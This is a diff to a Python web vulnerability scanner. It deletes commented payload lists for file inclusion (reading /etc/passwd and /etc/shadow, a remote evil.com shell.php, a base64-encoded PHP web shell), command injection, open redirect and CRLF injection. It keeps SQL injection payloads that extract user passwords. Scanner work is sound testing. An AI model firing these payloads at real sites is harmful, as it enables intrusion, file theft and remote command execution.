@@ -1,24 +1,9 @@
-
-"""
-WebSecScanner - Production-Grade Web Vulnerability Scanner
-
-A comprehensive web vulnerability scanner that detects OWASP Top 10 vulnerabilities
-and performs extensive security testing on web applications.
-"""
-
-
 import asyncio
-
 import datetime
-import hashlib
-import hmac
-import json
 import logging
 import os
-import random
 import re
 import socket
-
 import time
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
@@ -26,9 +11,6 @@ from dataclasses import dataclass, field
 from enum import Enum
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
-
-import aiohttp
-import dns.resolver
 import jinja2
 import requests
 import tldextract
@@ -147,8 +129,7 @@ class Scanner:
                  scan_subdomains: bool = True,
                  scan_js: bool = True):
         """
-        Initialize the scanner with configuration options.
-        
+       
         Args:
             target_url: The URL to scan
             output_dir: Directory to save reports
@@ -242,49 +223,7 @@ class Scanner:
                 "' UNION SELECT 1,2,3 --",
                 "' UNION SELECT username, password, 3 FROM users --"
             ],
-            # "lfi": [
-            #     "../../../../../../../etc/passwd",
-            #     "../../../../../../../etc/shadow",
-            #     "../../../../../../../windows/win.ini",
-            #     "../../../../../../../boot.ini",
-            #     "/etc/passwd",
-            #     "file:///etc/passwd",
-            #     "php://filter/convert.base64-encode/resource=index.php"
-            # ],
-            # "rfi": [
-            #     "http://evil.com/shell.php",
-            #     "https://evil.com/shell.php",
-            #     "//evil.com/shell.php",
-            #     "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
-            # ],
-            # "command_injection": [
-            #     "& ls -la",
-            #     "; ls -la",
-            #     "| ls -la",
-            #     "$(ls -la)",
-            #     "`ls -la`",
-            #     "&& ls -la",
-            #     "|| ls -la",
-            #     "& ping -c 5 127.0.0.1 &",
-            #     "; ping -c 5 127.0.0.1 ;",
-            #     "| ping -c 5 127.0.0.1 |"
-            # ],
            
-            # "open_redirect": [
-            #     "//evil.com",
-            #     "https://evil.com",
-            #     "/\\.evil.com",
-            #     "//google.com@evil.com",
-            #     "https://google.com@evil.com",
-            #     "javascript:alert('Open Redirect')"
-            # ],
-            # "crlf": [
-            #     "%0D%0ASet-Cookie: malicious=1",
-            #     "%0D%0AContent-Length: 0",
-            #     "%0D%0A%0D%0A<script>alert('CRLF')</script>",
-            #     "%E5%98%8A%E5%98%8DSet-Cookie: malicious=1",
-            #     "%0D%0ALocation: https://evil.com"
-            # ],
             "csrf_tokens": [
                 "csrftoken",
                 "csrf_token",
